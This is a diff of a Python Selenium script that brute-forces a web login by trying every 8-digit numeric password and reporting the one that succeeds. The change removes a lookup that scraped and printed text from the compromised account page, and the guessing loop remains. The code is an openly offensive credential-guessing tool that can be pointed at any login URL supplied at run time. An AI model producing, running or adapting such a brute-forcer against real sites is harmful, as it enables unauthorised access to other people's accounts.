@@ -18,7 +18,6 @@ login_button_selector = input()
 def brute_force_login():
     service = Service(driver_path)
     driver = webdriver.Chrome(service=service)
-    element = driver.find_element(By.CSS_SELECTOR, '#main > blockquote > table:nth-child(1) > tbody > tr > td:nth-child(1) > table > tbody > tr:nth-child(2) > td > b > font')
     driver.get(login_url)
     print('Starting brut-force!')
     for combination in itertools.product('0123456789', repeat=8):
@@ -35,8 +34,6 @@ def brute_force_login():
 
         if driver.current_url != login_url:
             print(f'Login successful with password : {password}' + driver.current_url)
-            text = element.text
-            print(f'Acount access get: {text}')
         
     driver.quit()
 
